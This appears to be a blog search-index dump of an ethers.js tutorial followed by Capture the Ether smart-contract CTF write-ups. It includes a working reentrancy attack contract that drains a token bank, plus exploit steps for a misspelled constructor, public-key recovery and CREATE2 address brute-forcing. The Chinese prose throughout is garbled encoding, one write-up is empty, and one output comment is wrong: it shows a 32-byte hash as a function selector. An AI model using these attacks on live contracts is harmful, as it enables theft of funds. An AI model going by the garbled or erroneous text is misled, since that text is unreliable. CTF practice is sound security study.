¼ï¼ˆä»¥gweiä¸ºå•ä½ï¼‰ï¼Œä½†æ˜¯åœ¨å‘é€äº¤æ˜“æ—¶ï¼Œä¸¤è€…éƒ½å¿…é¡»è½¬æ¢æˆä»¥weiä¸ºå•ä½çš„æ•°å€¼ã€‚ethers.jsæä¾›äº†ä¸€äº›åŠŸèƒ½å‡½æ•°ï¼Œæ–¹ä¾¿è¿™ç±»è½¬æ¢ã€‚ formatUnits(å˜é‡, å•ä½)ï¼šæ ¼å¼åŒ–ï¼Œå°å•ä½è½¬å¤§å•ä½ï¼Œæ¯”å¦‚wei -&gt; etherï¼Œåœ¨æ˜¾ç¤ºä½™é¢æ—¶å¾ˆæœ‰ç”¨ã€‚å‚æ•°ä¸­ï¼Œå•ä½å¡«ä½æ•°ï¼ˆæ•°å­—ï¼‰æˆ–æŒ‡å®šçš„å•ä½ï¼ˆå­—ç¬¦ä¸²ï¼‰ã€‚ 123456789101112131415//ä»£ç å‚è€ƒï¼šhttps://docs.ethers.io/v5/api/utils/display-logic/#utils-parseUnitsconsole.group(&#x27;\\n2. æ ¼å¼åŒ–ï¼šå°å•ä½è½¬å¤§å•ä½ï¼ŒformatUnits&#x27;);console.log(ethers.utils.formatUnits(oneGwei, 0));// &#x27;1000000000&#x27;console.log(ethers.utils.formatUnits(oneGwei, &quot;gwei&quot;));// &#x27;1.0&#x27;console.log(ethers.utils.formatUnits(oneGwei, 9));// &#x27;1.0&#x27;console.log(ethers.utils.formatUnits(oneGwei, &quot;ether&quot;));// `0.000000001`console.log(ethers.utils.formatUnits(1000000000, &quot;gwei&quot;));// &#x27;1.0&#x27;console.log(ethers.utils.formatEther(oneGwei));// `0.000000001` ç­‰åŒäºformatUnits(value, &quot;ether&quot;)console.groupEnd(); è¿è¡Œç»“æœï¼š parseUnitsï¼šè§£æï¼Œå¤§å•ä½è½¬å°å•ä½ï¼Œæ¯”å¦‚ether -&gt; weiï¼Œåœ¨å°†ç”¨æˆ·è¾“å…¥çš„å€¼è½¬ä¸ºweiä¸ºå•ä½çš„æ•°å€¼å¾ˆæœ‰ç”¨ã€‚å‚æ•°ä¸­ï¼Œå•ä½å¡«ä½æ•°ï¼ˆæ•°å­—ï¼‰æˆ–æŒ‡å®šçš„å•ä½ï¼ˆå­—ç¬¦ä¸²ï¼‰ã€‚ 1234567891011121314151617// 3. è§£æï¼šå¤§å•ä½è½¬å°å•ä½// ä¾‹å¦‚å°†etherè½¬æ¢ä¸ºweiï¼šparseUnits(å˜é‡, å•ä½),parseUnitsé»˜è®¤å•ä½æ˜¯ ether// ä»£ç å‚è€ƒï¼šhttps://docs.ethers.io/v5/api/utils/display-logic/#utils-parseUnitsconsole.group(&#x27;\\n3. è§£æï¼šå¤§å•ä½è½¬å°å•ä½ï¼ŒparseUnits&#x27;);console.log(ethers.utils.parseUnits(&quot;1.0&quot;).toString());// &#123; BigNumber: &quot;1000000000000000000&quot; &#125;console.log(ethers.utils.parseUnits(&quot;1.0&quot;, &quot;ether&quot;).toString());// &#123; BigNumber: &quot;1000000000000000000&quot; &#125;console.log(ethers.utils.parseUnits(&quot;1.0&quot;, 18).toString());// &#123; BigNumber: &quot;1000000000000000000&quot; &#125;console.log(ethers.utils.parseUnits(&quot;1.0&quot;, &quot;gwei&quot;).toString());// &#123; BigNumber: &quot;1000000000&quot; &#125;console.log(ethers.utils.parseUnits(&quot;1.0&quot;, 9).toString());// &#123; BigNumber: &quot;1000000000&quot; &#125;console.log(ethers.utils.parseEther(&quot;1.0&quot;).toString());// &#123; BigNumber: &quot;1000000000000000000&quot; &#125; ç­‰åŒäºparseUnits(value, &quot;ether&quot;)console.groupEnd(); è¿è¡Œç»“æœï¼š 12. CallStaticcallStaticæ–¹æ³•æ˜¯å±äºethers.Contractç±»çš„ç¼–å†™æ–¹æ³•åˆ†æï¼ŒåŒç±»çš„è¿˜æœ‰populateTransactionå’ŒestimateGasæ–¹æ³• 12.1 å¯èƒ½å¤±è´¥çš„äº¤æ˜“ åœ¨ä»¥å¤ªåŠä¸Šäº¤æ˜“éœ€è¦æ”¯ä»˜æ˜‚è´µçš„gasï¼Œå¹¶ä¸”æœ‰å¤±è´¥çš„é£é™©ï¼Œå‘é€å¤±è´¥çš„äº¤æ˜“å¹¶ä¸ä¼šæŠŠgasè¿”è¿˜ç»™ä½ ã€‚å› æ­¤ï¼Œåœ¨å‘é€äº¤æ˜“å‰çŸ¥é“å“ªäº›äº¤æ˜“å¯èƒ½ä¼šå¤±è´¥éå¸¸é‡è¦ã€‚ä»¥å°ç‹ç‹¸é’±åŒ…ï¼ˆmetamaskï¼‰ä¸ºä¾‹ã€‚ å¦‚æœäº¤æ˜“å°†å¤±è´¥ï¼Œå°ç‹ç‹¸ä¼šå‘Šè¯‰ä½  this transaction may failï¼Œç¿»è¯‘è¿‡æ¥å°±æ˜¯â€è¿™ç¬”äº¤æ˜“å¯èƒ½ä¼šå¤±è´¥â€ã€‚å½“ç”¨æˆ·çœ‹åˆ°æç¤ºçš„æ—¶å€™ï¼Œå°±å¯ä»¥å–æ¶ˆäº¤æ˜“äº†ã€‚ å®ç°çš„åŸç†ï¼šä»¥å¤ªåŠèŠ‚ç‚¹æœ‰ä¸€ä¸ªeth_callæ–¹æ³•ï¼Œè®©ç”¨æˆ·å¯ä»¥æ¨¡æ‹Ÿä¸€ç¬”äº¤æ˜“ï¼Œå¹¶è¿”å›å¯èƒ½çš„äº¤æ˜“ç»“æœï¼Œä½†ä¸æ˜¯çœŸæ­£çš„åœ¨åŒºå—é“¾ä¸Šæ‰§è¡Œï¼ˆäº¤æ˜“ä¸ä¸Šé“¾ï¼‰ã€‚ 12.2 callStatic åœ¨ethers.jsä¸­ä½ å¯ä»¥åˆ©ç”¨contractå¯¹è±¡çš„callStatic()æ¥è°ƒç”¨ä»¥å¤ªåŠèŠ‚ç‚¹çš„eth_callã€‚å¦‚æœè°ƒç”¨æˆåŠŸï¼Œåˆ™è¿”å›tureï¼›å¦‚æœå¤±è´¥ï¼Œåˆ™æŠ¥é”™å¹¶è¿”å›å¤±è´¥åŸå› ã€‚æ–¹æ³•ï¼š 12const tx = await contract.callStatic.å‡½æ•°å( å‚æ•°, &#123;override&#125;)console.log(`äº¤æ˜“ä¼šæˆåŠŸå—ï¼Ÿï¼š`, tx) å‡½æ•°åï¼šä¸ºæ¨¡æ‹Ÿè°ƒç”¨çš„å‡½æ•°åã€‚ å‚æ•°ï¼šè°ƒç”¨å‡½æ•°çš„å‚æ•°ã€‚ {override}ï¼šé€‰å¡«ï¼Œå¯åŒ…å«ä¸€ä¸‹å‚æ•°ï¼š fromï¼šæ‰§è¡Œæ—¶çš„msg.senderï¼Œä¹Ÿå°±æ˜¯ä½ å¯ä»¥æ¨¡æ‹Ÿä»»ä½•ä¸€ä¸ªäººçš„è°ƒç”¨ï¼Œæ¯”å¦‚Vç¥ã€‚ valueï¼šæ‰§è¡Œæ—¶çš„msg.valueã€‚ blockTagï¼šæ‰§è¡Œæ—¶çš„åŒºå—é«˜åº¦ã€‚ gasPrice gasLimit nonce 12.3 ç”¨callStatic æ¨¡æ‹ŸDAIè½¬è´¦æ¼”ç¤ºè¿‡ç¨‹â€”-ã€‹åšå®¢ 13. ç¼–ç  calldata13.1 æ¥å£ç±»Interface ethers.js çš„æ¥å£ç±»æŠ½è±¡äº†ä¸ä»¥å¤ªåŠç½‘ç»œçš„åˆçº¦äº¤äº’æ‰€éœ€çš„ABIç¼–ç å’Œè§£ç ã€‚ABIä¸APIç±»ä¼¼ï¼Œæ˜¯ä¸€æ ¼å¼ï¼Œç”¨äºå¯¹åˆçº¦å¯ä»¥å¤„ç†çš„å„ç§ç±»å‹çš„æ•°æ®è¿›è¡Œç¼–ç ï¼Œä»¥ä¾¿å®ƒä»¬å¯ä»¥äº¤äº’ã€‚ å¯ä»¥åˆ©ç”¨abiç”Ÿæˆæˆ–è€…ç›´æ¥ä»åˆçº¦ä¸­è·å–interfaceå˜é‡ï¼š 1234// åˆ©ç”¨abiç”Ÿæˆconst interface = new ethers.utils.Interface(abi)// ç›´æ¥ä»contractä¸­è·å–const interface2 = contract.interface æ¥å£ç±»å°è£…äº†ä¸€äº›ç¼–ç è§£ç çš„æ–¹æ³•ã€‚ä¸ä¸€äº›ç‰¹æ®Šçš„åˆçº¦äº¤äº’æ—¶ï¼ˆæ¯”å¦‚ä»£ç† åˆçº¦ï¼‰ï¼Œä½ éœ€è¦ç¼–ç å‚æ•°ã€è§£ç è¿”å›å€¼ï¼š æ³¨ï¼šç›¸å…³å‡½æ•°å¿…é¡»åŒ…å«åœ¨abiä¸­ã€‚ getSighash():è·å–å‡½æ•°é€‰æ‹©å™¨ï¼ˆfunction selectorï¼‰ï¼Œå‚æ•°ä¸ºå‡½æ•°åæˆ–å‡½æ•°ç­¾åã€‚ è‡³äºå‡½æ•°ç­¾åå¦‚ä½•è·å–ï¼Œåœ¨remixä¸Šä½¿ç”¨keccak256()æˆ–çš„å’Œethersjsä½¿ç”¨keccak256()è·å–çš„ç»“æœå®Œå…¨ä¸ä¸€æ ·ï¼Œæ—¥åç©ºé—²äº†å†ä»”ç»†æ·±å…¥å­¦ä¹  12interface.getSighash(&quot;balanceOf&quot;);// &#x27;0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef&#x27; encodeDeploy()ï¼šç¼–ç æ„é€ å™¨çš„å‚æ•°ï¼Œç„¶åå¯ä»¥é™„åœ¨åˆçº¦å­—èŠ‚ç çš„åé¢ã€‚ 1interface.encodeDeploy(&quot;Wrapped ETH&quot;, &quot;WETH&quot;); encodeFunctionData()ï¼šç¼–ç å‡½æ•°çš„calldataã€‚ 1interface.encodeFunctionData(&quot;balanceOf&quot;, [&quot;0xc778417e063141139fce010982780140aa0cd5ab&quot;]); decodeFunctionResult()ï¼šè§£ç å‡½æ•°çš„è¿”å›å€¼ã€‚ 1interface.decodeFunctionResult(&quot;balanceOf&quot;, resultData)","categories":[{"name":"Utils","slug":"Utils","permalink":"https://biyouqiuqiu.com/categories/Utils/"},{"name":"Ethers.js","slug":"Utils/Ethers-js","permalink":"https://biyouqiuqiu.com/categories/Utils/Ethers-js/"}],"tags":[{"name":"ethers.js","slug":"ethers-js","permalink":"https://biyouqiuqiu.com/tags/ethers-js/"}]},{"title":"TokenBankChallenge","slug":"CTFS/capther the ether/TokenBankChallenge ","date":"2023-04-24T10:50:10.000Z","updated":"2023-04-24T10:50:10.000Z","comments":true,"path":"2023/04/24/CTFS/capther the ether/TokenBankChallenge /","link":"","permalink":"https://biyouqiuqiu.com/2023/04/24/CTFS/capther%20the%20ether/TokenBankChallenge%20/","excerpt":"","text":"1. é¢˜ç›® I created a token bank. It allows anyone to deposit tokens by transferring them to the bank and then to withdraw those tokens later. It uses ERC 223 to accept the incoming tokens. The bank deploys a token called â€œSimple ERC223 Tokenâ€ and assigns half the tokens to me and half to you. You win this challenge if you can empty the bank. æºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109pragma solidity ^0.4.21;interface ITokenReceiver &#123; function tokenFallback(address from, uint256 value, bytes data) external;&#125;contract SimpleERC223Token &#123; // Track how many tokens are owned by each address. mapping (address =&gt; uint256) public balanceOf; string public name = &quot;Simple ERC223 Token&quot;; string public symbol = &quot;SET&quot;; uint8 public decimals = 18; uint256 public totalSupply = 1000000 * (uint256(10) ** decimals); event Transfer(address indexed from, address indexed to, uint256 value); function SimpleERC223Token() public &#123; balanceOf[msg.sender] = totalSupply; emit Transfer(address(0), msg.sender, totalSupply); &#125; function isContract(address _addr) private view returns (bool is_contract) &#123; uint length; assembly &#123; //retrieve the size of the code on target address, this needs assembly length := extcodesize(_addr) &#125; return length &gt; 0; &#125; function transfer(address to, uint256 value) public returns (bool success) &#123; bytes memory empty; return transfer(to, value, empty); &#125; function transfer(address to, uint256 value, bytes data) public returns (bool) &#123; require(balanceOf[msg.sender] &gt;= value); balanceOf[msg.sender] -= value; balanceOf[to] += value; emit Transfer(msg.sender, to, value); if (isContract(to)) &#123; ITokenReceiver(to).tokenFallback(msg.sender, value, data); &#125; return true; &#125; event Approval(address indexed owner, address indexed spender, uint256 value); mapping(address =&gt; mapping(address =&gt; uint256)) public allowance; function approve(address spender, uint256 value) public returns (bool success) &#123; allowance[msg.sender][spender] = value; emit Approval(msg.sender, spender, value); return true; &#125; function transferFrom(address from, address to, uint256 value) public returns (bool success) &#123; require(value &lt;= balanceOf[from]); require(value &lt;= allowance[from][msg.sender]); balanceOf[from] -= value; balanceOf[to] += value; allowance[from][msg.sender] -= value; emit Transfer(from, to, value); return true; &#125;&#125;contract TokenBankChallenge &#123; SimpleERC223Token public token; mapping(address =&gt; uint256) public balanceOf; function TokenBankChallenge(address player) public &#123; token = new SimpleERC223Token(); // Divide up the 1,000,000 tokens, which are all initially assigned to // the token contract&#x27;s creator (this contract). balanceOf[msg.sender] = 500000 * 10**18; // half for me balanceOf[player] = 500000 * 10**18; // half for you &#125; function isComplete() public view returns (bool) &#123; return token.balanceOf(this) == 0; &#125; function tokenFallback(address from, uint256 value, bytes) public &#123; require(msg.sender == address(token)); require(balanceOf[from] + value &gt;= balanceOf[from]); balanceOf[from] += value; &#125; function withdraw(uint256 amount) public &#123; require(balanceOf[msg.sender] &gt;= amount); require(token.transfer(msg.sender, amount)); balanceOf[msg.sender] -= amount; &#125;&#125; 2. åˆ†æé˜…è¯»ä»£ç å¯çŸ¥ï¼Œèƒ½å¤Ÿæ”¹å˜challengeåˆçº¦çš„ä½™é¢çš„å‡½æ•°åªæœ‰withdrawï¼Œè¿™é‡Œæœ‰ä¸ªæ¼æ´å¾ˆç†Ÿæ‚‰ï¼ˆè€æœ‹å‹äº†ï¼Œå…ˆæ‰§è¡Œè½¬è´¦æ“ä½œï¼Œå†æ”¹å˜ä½™é¢ï¼‰ï¼Œåˆ†ætokençš„transferå‡½æ•° 1234567891011121314151617function transfer(address to, uint256 value) public returns (bool success) &#123; bytes memory empty; return transfer(to, value, empty); &#125; function transfer(address to, uint256 value, bytes data) public returns (bool) &#123; require(balanceOf[msg.sender] &gt;= value); balanceOf[msg.sender] -= value; balanceOf[to] += value; emit Transfer(msg.sender, to, value); if (isContract(to)) &#123; ITokenReceiver(to).tokenFallback(msg.sender, value, data); &#125; return true; &#125; æœç„¶ä¸å‡ºæ‰€æ–™ï¼Œå¯ä»¥é‡‡ç”¨é‡å…¥çš„æ–¹å¼ç›—å–blankã€‚åªè¦toå®ç°äº†tokenFallbackå‡½æ•°ï¼Œå°±å¯ä»¥æ‰§è¡Œ toåˆçº¦ä¸­çš„tokenFallbackå‡½æ•°ï¼Œè‡³äºå‡½æ•°è¦å¹²ä»€ä¹ˆï¼Œå°±ç”±æˆ‘è¯´äº†ç®—ã€‚åªè¦åœ¨ä½™é¢æ›´æ–°ä¹‹å‰å†æ¬¡è°ƒç”¨withdrawå‡½æ•°ï¼Œå³å¯å°†tokenç›—ç©ºã€‚æ³¨æ„ä¸èƒ½å‡ºç°æ­»å¾ªç¯è°ƒç”¨ã€‚ 3. è§£é¢˜æ”»å‡»åˆçº¦ 1234567891011121314151617contract Hack is ITokenReceiver&#123; TokenBankChallenge challenge; bool flag = true; function tokenFallback(address from, uint256 value, bytes data) external &#123; if (flag) &#123; flag = false; challenge.withdraw(500000 * 10**18); &#125; &#125; function attack(address _challenge) public &#123; challenge = TokenBankChallenge(_challenge); challenge.withdraw(500000 * 10**18); &#125;&#125; æ”»å‡»é€»è¾‘ éƒ¨ç½²Hackï¼Œæ ¹æ® Hackéƒ¨ç½²challengeï¼Œå°†challengeä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨attackå‡½æ•°å³å¯ã€‚ ![image-20240412145715561](TokenBankChallenge &#x2F;image-20240412145715561.png) è§£é¢˜æˆåŠŸ~","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Assume ownership","slug":"CTFS/capther the ether/Assume ownership","date":"2023-04-24T09:50:10.000Z","updated":"2023-04-24T09:50:10.000Z","comments":true,"path":"2023/04/24/CTFS/capther the ether/Assume ownership/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/24/CTFS/capther%20the%20ether/Assume%20ownership/","excerpt":"","text":"1. é¢˜ç›® To complete this challenge, become the owner æºç  12345678910111213141516pragma solidity ^0.4.21;contract AssumeOwnershipChallenge &#123; address owner; bool public isComplete; function AssumeOwmershipChallenge() public &#123; owner = msg.sender; &#125; function authenticate() public &#123; require(msg.sender == owner); isComplete = true; &#125;&#125; 2. åˆ†ææ„é€ å™¨æ‹¼å†™é”™è¯¯ï¼ŒAssumeOwmershipChallengeå¯ä¾›ä»»ä½•äººè°ƒç”¨ã€‚ 3.è§£é¢˜å…ˆè°ƒç”¨AssumeOwmershipChallengeå‡½æ•°ï¼Œå†è°ƒç”¨authenticateå‡½æ•° ![image-20240412143811623](Assume ownership&#x2F;image-20240412143811623.png) è§£é¢˜æˆåŠŸ~","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Account Takeover","slug":"CTFS/capther the ether/Account Takeover","date":"2023-04-24T08:50:10.000Z","updated":"2023-04-24T08:50:10.000Z","comments":true,"path":"2023/04/24/CTFS/capther the ether/Account Takeover/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/24/CTFS/capther%20the%20ether/Account%20Takeover/","excerpt":"","text":"1. é¢˜ç›® To complete this challenge, send a transaction from the ownerâ€˜s account. æºç  123456789101112pragma solidity ^0.4.21;contract AccountTakeoverChallenge &#123; address owner = 0x6B477781b0e68031109f21887e6B5afEAaEB002b; bool public isComplete; function authenticate() public &#123; require(msg.sender == owner); isComplete = true; &#125;&#125; 2. åˆ†æ3.è§£é¢˜","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Public Key","slug":"CTFS/capther the ether/Public Key","date":"2023-04-24T07:50:10.000Z","updated":"2023-04-24T07:50:10.000Z","comments":true,"path":"2023/04/24/CTFS/capther the ether/Public Key/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/24/CTFS/capther%20the%20ether/Public%20Key/","excerpt":"","text":"Public Key1. é¢˜ç›® Recall that an address is the last 20 bytes of the keccak-256 hash of the addressâ€™s public key. To complete this challenge, find the public key for the ownerâ€˜s account. æºç  123456789101112pragma solidity ^0.4.21;contract PublicKeyChallenge &#123; address owner = 0x92b28647ae1f3264661f72fb2eb9625a89d88a31; bool public isComplete; function authenticate(bytes publicKey) public &#123; require(address(keccak256(publicKey)) == owner); isComplete = true; &#125;&#125; 2. åˆ†æ æŒ‰é¢˜ç›®çš„æ„æ€æ¥ï¼Œowneråº”è¯¥å°±æ˜¯åˆçº¦çš„éƒ¨ç½²è€…ï¼Œæˆ‘ä»¬è¦ä»äº¤æ˜“ä¸­è·å–å…¬é’¥ï¼Œè€Œåœ°å€çš„è®¡ç®—å…¬å¼ä¸ºaddress = address(keccak256(publicKey))ï¼Œæ‰€ä»¥åªè¦ä»äº¤æ˜“ä¸­è¿˜åŸå‡º publicKeyå³å¯ã€‚ å› ä¸ºRopsten ç½‘ç»œå·²ç»åœç”¨ï¼Œæ‰€ä»¥è¦å¤ç°è¯¥é¢˜åªèƒ½å¯¹åˆçº¦è¿›è¡Œä¿®æ”¹äº†ï¼Œå°†ownerä¿®æ”¹ä¸ºæœ¬åœ°è´¦æˆ· 1234567891011pragma solidity ^0.4.21;contract PublicKeyChallenge &#123; address owner = 0xfDc84b042c01F01C7cC6eF08452BA156844c3A5C; // æœ¬åœ°è´¦æˆ· bool public isComplete; function authenticate(bytes publicKey) public &#123; require(address(keccak256(publicKey)) == owner); isComplete = true; &#125;&#125; æœ¬äººè‡ªå·±ç¢ç£¨äº†å¾ˆä¹…ï¼Œè‡ªå·±å†™å‡ºæ¥çš„ä¸€ä¸ªè„šæœ¬ï¼Œç”¨äºé€šè¿‡ txhashè·å–å…¬é’¥ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445import &#123; ethers &#125; from &quot;ethers&quot;;// providerconst connection = &quot;&quot;;const provider = new ethers.providers.JsonRpcProvider(connection);// äº¤æ˜“çš„hashconst txHash = &quot;&quot;;// è·å–äº¤æ˜“ä¿¡æ¯const transaction = await provider.getTransaction(txHash);// console.log(`transaction =&gt; `,transaction); //æ‰“å°äº¤æ˜“è¯¦æƒ…// txData å¯¹è±¡å†…çš„å­—æ®µç¼ºä¸€ä¸å¯const txData = &#123; // gasPrice: transaction.gasPrice, // è¿™ä¸ªä¸éœ€è¦ï¼Œå¦åˆ™ä¼šæŠ¥é”™ gasLimit: transaction.gasLimit, value: transaction.value, nonce: transaction.nonce, data: transaction.data, to: transaction.to, chainId: transaction.chainId, type: transaction.type, maxFeePerGas: transaction.maxFeePerGas, maxPriorityFeePerGas: transaction.maxPriorityFeePerGas,&#125;// å¯¹txDataäº¤æ˜“å¯¹è±¡åºåˆ—åŒ–ä¸ºå…¶åŸå§‹äºŒè¿›åˆ¶æ ¼å¼const signingData = ethers.utils.serializeTransaction(txData);// å¯¹åºåˆ—åŒ–åçš„äº¤æ˜“å¯¹è±¡è¿›è¡Œhashconst msgHash = ethers.utils.keccak256(signingData);// è·å–äº¤æ˜“è¯¦æƒ…ä¸­çš„ r s vconst signature = &#123;r: transaction.r, s: transaction.s, v: transaction.v&#125;;// è·å–åŸç”Ÿæœªå‹ç¼©çš„å…¬é’¥ï¼Œå³ 0x04 å¼€å¤´çš„let rawPublicKey = ethers.utils.recoverPublicKey(msgHash, signature);console.log(rawPublicKey);// æŠŠå¼€å¤´çš„ 0x04 å­—æ®µåˆ æ‰ ===ã€‹ å°† `0x04` æ›¿æ¢æˆ `0x`rawPublicKey = `0x$&#123;rawPublicKey.slice(4)&#125;`;console.log(rawPublicKey); 3. è§£é¢˜éƒ¨ç½²challengeï¼Œé€šè¿‡è„šæœ¬è®¡ç®—å‡ºå…¬é’¥ ![image-20240412145137751](Public Key&#x2F;image-20240412145137751.png) è°ƒç”¨hackerä¸­çš„attack()å‡½æ•° ![image-20240412145149249](Public Key&#x2F;image-20240412145149249.png) è§£é¢˜æˆåŠŸ~","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"Fuzzy identity","slug":"CTFS/capther the ether/Fuzzy identity","date":"2023-04-17T02:50:10.000Z","updated":"2023-04-17T02:50:10.000Z","comments":true,"path":"2023/04/17/CTFS/capther the ether/Fuzzy identity/","link":"","permalink":"https://biyouqiuqiu.com/2023/04/17/CTFS/capther%20the%20ether/Fuzzy%20identity/","excerpt":"","text":"Fuzzy identity1. é¢˜ç›® 1.1 This contract can only be used by me (smarx). I donâ€™t trust myself to remember my private key, so Iâ€™ve made it so whatever address Iâ€™m using in the future will work: I always use a wallet contract that returns â€œsmarxâ€ if you ask its name. Everything I write has bad code in it, so my address always includes the hex string badc0de. To complete this challenge, steal my identity! 1.2 æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.21;interface IName &#123; function name() external view returns (bytes32);&#125;contract FuzzyIdentityChallenge &#123; bool public isComplete; function authenticate() public &#123; require(isSmarx(msg.sender)); require(isBadCode(msg.sender)); isComplete = true; &#125; function isSmarx(address addr) internal view returns (bool) &#123; return IName(addr).name() == bytes32(&quot;smarx&quot;); &#125; function isBadCode(address _addr) internal pure returns (bool) &#123; bytes20 addr = bytes20(_addr); bytes20 id = hex&quot;000000000000000000000000000000000badc0de&quot;; bytes20 mask = hex&quot;000000000000000000000000000000000fffffff&quot;; for (uint256 i = 0; i &lt; 34; i++) &#123; if (addr &amp; mask == id) &#123; return true; &#125; mask &lt;&lt;= 4; id &lt;&lt;= 4; &#125; return false; &#125;&#125; 2. åˆ†æ 2.1 åˆ†æä»£ç å¯çŸ¥ï¼Œè¦æ˜¯ isCompleteçš„å€¼ä¸º true éœ€è¦æˆåŠŸè°ƒç”¨ authenticateå‡½æ•° 2.2 ä½†æ˜¯éœ€è¦é€šè¿‡ä¸¤å±‚æ ¡éªŒï¼Œç¬¬ä¸€å±‚ç®€å•ï¼Œç›´æ¥æŒ‰è¦æ±‚ç¼–å†™ä¸€ä¸ªåä¸ºnameçš„å‡½æ•°çš†å¯ï¼Œç¬¬äºŒä¸ªå‡½æ•°è¦æ±‚ä¼ å…¥çš„åœ°å€æ˜¯ä»¥ badc0de ç»“å°¾çš„ï¼Œæˆ‘åœ¨è¿™é‡Œæƒ³åˆ°äº†ä½¿ç”¨ create2 çš„æ–¹æ³•æ¥æ„é€ ä¸€ä¸ªä»¥ badc0deç»“å°¾çš„åœ°å€ã€‚ è®¡ç®—è„šæœ¬ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import &#123; ethers &#125; from &quot;ethers&quot;/** * create2 è®¡ç®—åˆçº¦åœ°å€æ‰€éœ€è¦çš„å››ä¸ªå€¼ * * 1. 0xFFï¼šä¸€ä¸ªå¸¸æ•°ï¼Œé¿å…å’ŒCREATEå†²çª 2. åˆ›å»ºè€…åœ°å€ 3. saltï¼ˆç›ï¼‰ï¼šä¸€ä¸ªåˆ›å»ºè€…ç»™å®šçš„æ•°å€¼ 4. å¾…éƒ¨ç½²åˆçº¦çš„å­—èŠ‚ç ï¼ˆbytecodeï¼‰ */// 1. å¸¸æ•°const const_num = &quot;0xFF&quot;;// 2. åˆ›å»ºè€…åœ°å€ï¼ˆåˆçº¦åœ°å€ï¼‰// ä¸€èˆ¬æƒ…å†µä¸‹æ˜¯ï¼š address(this)// æ‹¼æ¥çš„æ—¶å€™ä¸èƒ½åŒ…å« `0x`const contract_add = &quot;0xf8e81D47203A594245E36C48e151709F0C19fBe8&quot;;// 3. æ‹¼æ¥ let str1 = const_num + contract_add.slice(2,contract_add.length);// 4. ä»£éƒ¨ç½²åˆçº¦çš„å­—èŠ‚ç çš„hashå€¼const bytecode = &quot;0x6060604052341561000f57600080fd5b6102108061001e6000396000f30060606040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff16806306fdde0314610051578063d018db3e14610082575b600080fd5b341561005c57600080fd5b6100646100bb565b60405180826000191660001916815260200191505060405180910390f35b341561008d57600080fd5b6100b9600480803573ffffffffffffffffffffffffffffffffffffffff169060200190919050506100e3565b005b60007f736d617278000000000000000000000000000000000000000000000000000000905090565b60008190508073ffffffffffffffffffffffffffffffffffffffff1663380c7a676040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b151561014b57600080fd5b5af1151561015857600080fd5b5050508073ffffffffffffffffffffffffffffffffffffffff1663b2fa1c9e6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401602060405180830381600087803b15156101be57600080fd5b5af115156101cb57600080fd5b5050506040518051905015156101e057600080fd5b50505600a165627a7a7230582063de817dba94ce175bbb183123a834c18147e9cd341cefbe4d1e5aee5ee963310029&quot;;// 5.1 å¯¹bytecode è¿›è¡Œhashè¿ç®— è¿™ä¸ªåªèƒ½ç”¨å•å¼•å·// solidityKeccak256([&#x27;bytes&#x27;],[bytecode]) &lt;=&gt; keccak256(abi.encodePacked(bytecode))const bytecodeToHash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;],[bytecode]);// 5.2 ä¸‹é¢è¿™è¡Œä»£ç ä¹Ÿè¡Œï¼Œå› ä¸ºå¯¹ bytecodeè¿›è¡Œç´§æ‰“åŒ…çš„ç»“æœä¸å˜// const bytecodeToHash = ethers.utils.keccak256(bytecode);// console.log(bytecodeToHash)// 5. å®šä¹‰ä¸€ä¸ªç›ï¼Œä»¥åŠä¸€ä¸ªæ‰€æ±‚å­—æ®µlet salt = 0;const value = &quot;badc0de&quot;; // CTFé¶åœºçš„é¢˜// éå†å‡ºæŒ‡å®šå€¼ï¼Œæ±‚å‡ºsaltwhile (true) &#123; // å°†saltè½¬ä¸º16è¿›åˆ¶ï¼Œç”¨0å¡«å……ä¸º64ä½ // let saltToBytes = salt.toString(16).padStart(64, 0).toString(); let saltToHash = ethers.utils.solidityKeccak256([&#x27;uint&#x27;],[salt]); saltToHash = saltToHash.slice(2, saltToHash.length) // å†æ¬¡æ‹¼æ¥ é¡ºåºï¼š å¸¸æ•° åˆ›å»ºè€…åœ°å€ ç› 